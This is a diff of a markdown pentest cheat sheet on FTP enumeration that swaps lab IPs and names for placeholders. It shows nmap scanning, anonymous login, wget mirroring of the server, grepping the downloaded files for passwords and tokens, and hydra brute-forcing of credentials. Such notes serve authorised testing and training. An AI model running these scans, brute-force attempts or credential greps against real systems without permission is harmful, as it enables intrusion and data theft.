@@ -121,7 +121,7 @@ Anonymous + write access is the highest-impact combo. Anonymous + read access is
 ### Banner grab + scripted scan
 
 ```shell
-sudo nmap -sV -sC -p21 -A 10.129.14.136
+sudo nmap -sV -sC -p21 -A 10.0.14.136
 ```
 
 Output:
@@ -172,13 +172,13 @@ ftp-vuln-cve2010-4221.nse      # ProFTPd CVE-2010-4221
 ### Anonymous login walkthrough
 
 ```shell
-ftp 10.129.14.136
+ftp 10.0.14.136
 ```
 
 ```
-Connected to 10.129.14.136.
-220 "Welcome to the HTB Academy vsFTP service."
-Name (10.129.14.136:cry0l1t3): anonymous
+Connected to 10.0.14.136.
+220 "Welcome to the Example vsFTP service."
+Name (10.0.14.136:jdoe): anonymous
 331 Please specify the password.
 Password:                          # any value, often blank
 230 Login successful.
@@ -209,16 +209,16 @@ ftp> ! <cmd>             # run local shell command without disconnecting
 `wget` mirrors an entire FTP tree:
 
 ```shell
-wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
+wget -m --no-passive ftp://anonymous:anonymous@10.0.14.136
 ```
 
-Result: a local directory tree `10.129.14.136/` with everything you have access to. The `--no-passive` flag forces active mode - useful when you're behind a NAT yourself and the server requires passive.
+Result: a local directory tree `10.0.14.136/` with everything you have access to. The `--no-passive` flag forces active mode - useful when you're behind a NAT yourself and the server requires passive.
 
 ```
-10.129.14.136/
+10.0.14.136/
 ├── Calendar.pptx
 ├── Clients/
-│   └── Inlanefreight/
+│   └── Example/
 │       ├── appointments.xlsx
 │       ├── contract.docx
 │       ├── meetings.txt
@@ -232,7 +232,7 @@ Result: a local directory tree `10.129.14.136/` with everything you have access 
 Then locally grep for credentials, internal hostnames, sensitive content:
 
 ```shell
-grep -rIEi 'password|api[_-]?key|secret|token|bearer' 10.129.14.136/
+grep -rIEi 'password|api[_-]?key|secret|token|bearer' 10.0.14.136/
 ```
 
 ### Detecting `hide_ids` (the defensive setting)
@@ -259,8 +259,8 @@ You've leaked the UID. `1002` is often a real Linux user account; combine with u
 `netcat` or `telnet` work directly against the control channel:
 
 ```shell
-nc -nv 10.129.14.136 21
-telnet 10.129.14.136 21
+nc -nv 10.0.14.136 21
+telnet 10.0.14.136 21
 ```
 
 ```
@@ -291,32 +291,32 @@ Useful when you need to send specific commands the FTP client doesn't expose, or
 If the server runs FTPS (FTP over TLS, port 990 or STARTTLS on 21), use `openssl` to interact:
 
 ```shell
-openssl s_client -connect 10.129.14.136:21 -starttls ftp
+openssl s_client -connect 10.0.14.136:21 -starttls ftp
 ```
 
 ```
 CONNECTED(00000003)
-depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev,
-       CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
+depth=0 C = US, ST = California, L = Sacramento, O = Example, OU = Dev,
+       CN = master.example.local, emailAddress = admin@example.local
 verify error:num=18:self signed certificate
 ...
 220 (vsFTPd 3.0.3)
 ```
 
-The TLS certificate is intel itself - common name reveals the internal hostname (`master.inlanefreight.htb`); subject email reveals an admin contact (`admin@inlanefreight.htb`).
+The TLS certificate is intel itself - common name reveals the internal hostname (`master.example.local`); subject email reveals an admin contact (`admin@example.local`).
 
 ### Credential brute-force
 
 When anonymous fails but the engagement permits brute-force:
 
 ```shell
-hydra -L users.txt -P passwords.txt ftp://10.129.14.136
+hydra -L users.txt -P passwords.txt ftp://10.0.14.136
 ```
 
 Or with Nmap's `ftp-brute` (slower but stealthier in nmap output):
 
 ```shell
-nmap --script ftp-brute -p21 10.129.14.136 \
+nmap --script ftp-brute -p21 10.0.14.136 \
   --script-args userdb=users.txt,passdb=passwords.txt
 ```
 
